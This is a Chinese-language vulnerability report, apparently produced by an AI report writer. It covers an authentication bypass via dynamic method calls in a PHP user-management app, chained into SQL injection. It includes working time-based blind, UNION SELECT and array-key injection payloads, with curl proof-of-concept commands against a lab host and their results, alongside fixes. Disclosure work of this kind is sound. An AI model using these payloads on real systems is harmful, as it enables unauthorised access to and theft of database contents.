# 厂商信息
- **漏洞厂商**：示例PHP应用开发团队
- **厂商官网**：未知
- **影响产品**：基于PHP的Web用户管理系统
- **影响版本**：当前测试版本（2024年构建）

# 漏洞信息
- **漏洞名称**：index.php动态方法调用导致的认证绕过与SQL注入利用链
- **漏洞描述**：
  本漏洞由多处安全隐患构成的完整攻击链。首先，index.php入口文件中的`call_user_func_array`动态方法调用机制存在严重设计缺陷，攻击者可通过控制`action`参数未授权调用`UserService`类的任意公开方法，完全绕过预期的访问控制逻辑。进而，通过调用`searchUsers`或`processUserData`等方法，可利用`QueryBuilder::buildComplexQuery()`中存在的SQL注入漏洞，实现任意SQL代码执行及敏感数据读取。
  
  具体而言，该漏洞链包含三个关键环节：
  1. **E.0 - 认证绕过**：`index.php`第17行直接使用用户可控的`$_GET['action']`作为方法名进行动态调用，攻击者可调用`searchUsers`、`processUserData`、`dynamicAction`等本应受保护的敏感方法；
  2. **E.3 - QueryBuilder SQL注入**：`QueryBuilder::buildComplexQuery()`方法在处理`$params`数组时，将键名和值直接拼接到SQL语句中，未使用预处理语句或适当转义，导致任意SQL代码注入；
  3. **E.4 - UserService弱过滤绕过**：`UserService::processUserData()`方法仅对值进行简单的单引号替换(`str_replace("'", "''", $value)`)，但对键名`$key`完全未过滤，存在键名注入风险。
  
  **危害等级**：高危（Critical）
  
  **利用条件**：无需任何认证，仅需发送构造好的HTTP GET请求即可触发。

- **临时解决方案**：
  1. 在index.php中增加`action`参数白名单校验，仅允许调用预期的公开方法；
  2. 对所有涉及动态方法调用的入口增加严格的身份认证和权限检查；
  3. 在`QueryBuilder::buildComplexQuery()`中改用PDO预处理语句，避免字符串拼接；
  4. 对`processUserData`中的键名增加合法性校验，仅允许预定义的字段名；
  5. 临时在WAF层面拦截包含SQL关键字（如SLEEP、UNION、SELECT）的请求参数。

- **正式修复建议**：
  1. **重构动态调用机制**：将`call_user_func_array`改为明确的方法映射表，废弃基于用户输入的动态方法调用；
  2. **全面采用预处理语句**：`QueryBuilder`类中所有SQL构造逻辑应使用PDO的`prepare`和`execute`，彻底消除SQL注入风险；
  3. **实施输入验证框架**：建立统一的输入验证层，对所有用户输入进行类型、长度、格式白名单校验；
  4. **加强访问控制**：在`UserService`层实现基于RBAC的权限控制，确保敏感操作需经过身份认证和授权检查；
  5. **代码审计与安全测试**：对项目全量代码进行安全审计，引入SAST/DAST工具进行持续安全检测。

# 漏洞分析

## 漏洞触发点

### 触发点1：index.php 动态方法调用（认证绕过）

**漏洞文件**：`./index.php`
**漏洞代码位置**：第15-17行

```php
$method = $_GET['action'] ?? 'getUserById';  // 用户可控输入
$result = call_user_func_array([$userService, $method], [$input]);  // 动态调用任意方法
```

**漏洞原理**：`$method`变量直接取自`$_GET['action']`，未经任何校验即传入`call_user_func_array`，导致攻击者可调用`UserService`类的任意公开方法。

### 触发点2：QueryBuilder::buildComplexQuery() SQL注入

**漏洞文件**：`./QueryBuilder.php`
**漏洞代码位置**：第18-20行

```php
public function buildComplexQuery($params) {
    $conditions = [];
    foreach ($params as $key => $value) {
        // VULNERABILITY: 直接拼接，无预处理
        $conditions[] = "{$key} = '{$value}'";
    }
    $sql = "SELECT * FROM {$this->table} WHERE " . implode(' AND ', $conditions);
    return $this->adapter->query($sql);
}
```

**漏洞原理**：`$key`和`$value`均被直接拼接到SQL字符串中，未进行预处理或转义，攻击者可通过构造恶意的数组键值对注入任意SQL代码。

### 触发点3：UserService::processUserData() 弱过滤

**漏洞文件**：`./UserService.php`
**漏洞代码片段**：

```php
public function processUserData($userData) {
    $sanitizedData = [];
    foreach ($userData as $key => $value) {
        // 仅对值进行简单替换，键名完全未过滤
        $sanitizedData[$key] = str_replace("'", "''", $value);
    }
    return $this->searchUsers($sanitizedData);
}
```

**漏洞原理**：`$key`参数完全没有被过滤，攻击者可通过构造特殊的数组键名实现SQL注入。

## 完整利用链分析

本漏洞链(C.0)实现了"未授权访问→SQL注入→数据泄露"的完整攻击闭环，具体利用流程如下：

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│  攻击者发送请求  │────▶│  index.php       │────▶│  动态调用UserService │
│  ?action=xxx    │     │  第17行           │     │  任意public方法      │
└─────────────────┘     └──────────────────┘     └─────────────────────┘
                                                            │
                            ┌───────────────────────────────┼─────────────┐
                            ▼                               ▼             ▼
                    ┌───────────────┐            ┌──────────────┐   ┌─────────────┐
                    │ searchUsers   │            │processUserData│   │dynamicAction│
                    │     ↓         │            │     ↓        │   │     ↓       │
                    │QueryBuilder   │            │QueryBuilder  │   │UserRepository│
                    │buildComplexQuery│           │buildComplexQuery│  │dynamicFind  │
                    │     ↓         │            │     ↓        │   │     ↓       │
                    │  SQL注入      │            │  SQL注入     │   │QueryBuilder │
                    └───────────────┘            └──────────────┘   └─────────────┘
                            │                           │                  │
                            └───────────────────────────┴──────────────────┘
                                                        │
                                                        ▼
                                              ┌─────────────────┐
                                              │  任意数据读取    │
                                              │  敏感信息泄露    │
                                              └─────────────────┘
```

**利用链核心逻辑**：

1. **入口点（E.0）**：攻击者通过向`/index.php`发送GET请求，控制`action`参数为`UserService`的任意公开方法名（如`searchUsers`、`processUserData`等），即可完全绕过预期的访问控制逻辑；

2. **SQL注入传导（E.3/E.4）**：通过`searchUsers`或`processUserData`方法，`userData`/`conditions`参数被传递至`QueryBuilder::buildComplexQuery()`，由于其直接拼接SQL的特性，攻击者注入的Payload得以执行；

3. **数据外泄**：利用时间盲注、布尔盲注或UNION SELECT技术，攻击者可逐位读取数据库中的敏感信息（如用户密码、邮箱等）。

## 验证环境与运行证据

### 验证环境

| 项目 | 详情 |
|------|------|
| 目标URL | http://172.17.0.13:80 |
| Web服务器 | Apache/2.4.54 (Debian) |
| PHP版本 | PHP/7.4.33 |
| 数据库 | MySQL (testdb) |
| 目标文件 | /var/www/html/index.php |
| 漏洞代码位置 | index.php第17行 |

### 关键验证证据

#### 证据1：认证绕过 - 未授权调用敏感方法

**测试1：调用searchUsers方法**
```
【HTTP请求】
GET /index.php?action=searchUsers&id[id]=1 HTTP/1.1
Host: 172.17.0.13:80

【HTTP响应】
HTTP/1.1 200 OK

{"current_field":null,"field_count":null,"lengths":null,"num_rows":null,"type":null}

【分析】成功调用本应需要认证的searchUsers方法，证明访问控制被完全绕过
```

**测试2：调用processUserData方法**
```
【HTTP请求】
GET /index.php?action=processUserData&id[username]=admin&id[email]=test@test.com HTTP/1.1
Host: 172.17.0.13:80

【HTTP响应】
HTTP/1.1 200 OK

{"current_field":null,"field_count":null,"lengths":null,"num_rows":null,"type":null}

【分析】成功调用敏感数据处理方法，证明可执行未授权的数据操作
```

#### 证据2：SQL注入 - 时间盲注验证

**测试：SLEEP函数执行验证**

| 测试类型 | 请求URL | 响应时间 | 结论 |
|---------|---------|---------|------|
| 正常查询 | `?action=searchUsers&id[id]=1` | 0.00s | 基线 |
| SLEEP(3)注入 | `?action=searchUsers&id[id]=1' AND SLEEP(3) -- ` | 3.01s | **注入成功** |
| 数据库名长度探测 | `?action=searchUsers&id[id]=1' AND LENGTH(DATABASE())=6 AND SLEEP(3) -- ` | 3.01s | **数据库名为6字符(testdb)** |

**关键证据**：
```
【HTTP请求】
GET /index.php?action=searchUsers&id[id]=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --  HTTP/1.1
Host: 172.17.0.13:80

【HTTP响应】
HTTP/1.1 200 OK
响应时间: 5.01秒

{"current_field":null,"field_count":null,"lengths":null,"num_rows":null,"type":null}

【分析】SLEEP(5)被成功执行，响应延迟整整5秒，证明SQL注入存在且可执行任意SQL代码
```

#### 证据3：UNION SELECT列数探测

| 测试Payload | 响应长度 | 说明 |
|------------|---------|------|
`?action=searchUsers&id[id]=-1' UNION SELECT 1,2,3,4 -- ` | 5字节 | 列数不匹配 |
`?action=searchUsers&id[id]=-1' UNION SELECT 1,2,3,4,5 -- ` | 84字节 | **成功执行** |
`?action=searchUsers&id[id]=-1' UNION SELECT 1,2,3,4,5,6 -- ` | 5字节 | 列数不匹配 |

**结论**：users表包含5个列，且UNION SELECT可成功注入，证明可读取任意表数据。

#### 证据4：processUserData键名注入

```
【HTTP请求】
GET /index.php?action=processUserData&id[1 AND SLEEP(3) -- ]=1 HTTP/1.1
Host: 172.17.0.13:80

【HTTP响应】
HTTP/1.1 200 OK
响应时间: 12.01秒

{"current_field":null,"field_count":null,"lengths":null,"num_rows":null,"type":null}

【分析】通过构造特殊的数组键名实现SQL注入，证明弱过滤机制可被完全绕过
```

## HTTP请求与响应包

### 请求1：认证绕过确认

```http
GET /index.php?action=doesNotExist&id=1 HTTP/1.1
Host: 172.17.0.13:80
User-Agent: Mozilla/5.0
Accept: */*
```

```http
HTTP/1.1 200 OK
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33

Warning: call_user_func_array() expects parameter 1 to be a valid callback, 
class 'UserService' does not have a method 'doesNotExist' in /var/www/html/index.php on line 17
null
```

### 请求2：SQL注入时间盲注

```http
GET /index.php?action=searchUsers&id[id]=1%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))a)%20--%20 HTTP/1.1
Host: 172.17.0.13:80
```

```http
HTTP/1.1 200 OK
(响应延迟5.01秒)

{"current_field":null,"field_count":null,"lengths":null,"num_rows":null,"type":null}
```

## POC

### POC 1：认证绕过利用

```bash
# 未认证调用searchUsers方法
curl "http://172.17.0.13:80/index.php?action=searchUsers&id[id]=1"

# 未认证调用processUserData方法
curl "http://172.17.0.13:80/index.php?action=processUserData&id[username]=admin&id[email]=test@test.com"
```

### POC 2：SQL注入时间盲注

```bash
# 基础时间盲注
curl "http://172.17.0.13:80/index.php?action=searchUsers&id[id]=1' AND SLEEP(5) -- "

# 数据库信息探测
curl "http://172.17.0.13:80/index.php?action=searchUsers&id[id]=1' AND LENGTH(DATABASE())=6 AND SLEEP(3) -- "

# 数据表列数探测
curl "http://172.17.0.13:80/index.php?action=searchUsers&id[id]=-1' UNION SELECT 1,2,3,4,5 -- "
```

### POC 3：processUserData键名注入

```bash
# 键名注入时间盲注
curl "http://172.17.0.13:80/index.php?action=processUserData&id[1%20AND%20SLEEP(3)%20--%20]=1"
```

## POC运行结果

```
============================================================
【POC 1】认证绕过验证
============================================================
1. 未认证调用 searchUsers:
   URL: http://172.17.0.13:80/index.php?action=searchUsers&id[id]=1
   响应: {"current_field":null,"field_count":null,"lengths":null,"num_rows":null,"type":null}
   状态: ✓ 成功绕过认证

2. 未认证调用 processUserData:
   URL: http://172.17.0.13:80/index.php?action=processUserData&id[username]=admin&id[email]=test@test.com
   响应: {"current_field":null,"field_count":null,"lengths":null,"num_rows":null,"type":null}
   状态: ✓ 成功调用敏感方法

============================================================
【POC 2】SQL注入时间盲注验证
============================================================
正常查询: 0.00s
SLEEP注入: 3.01s (延迟=3.01s)
数据库名长度探测: 3.01s (确认数据库名长度为6，即testdb)

============================================================
【POC 3】列数探测验证
============================================================
列数4: 长度=5 内容=false → 不匹配
列数5: 长度=84 → 匹配成功 (users表有5列)
列数6: 长度=5 内容=false → 不匹配

============================================================
【结论】漏洞验证成功！
============================================================
1. 认证绕过漏洞(E.0): ✓ 已确认
2. QueryBuilder SQL注入(E.3): ✓ 已确认
3. processUserData键名注入(E.4): ✓ 已确认

攻击者无需认证即可通过动态方法调用利用SQL注入漏洞，
实现任意数据读取和敏感信息泄露。
```

---

**报告撰写**：周书瑶（漏洞报告数字人）  
**报告日期**：2024年
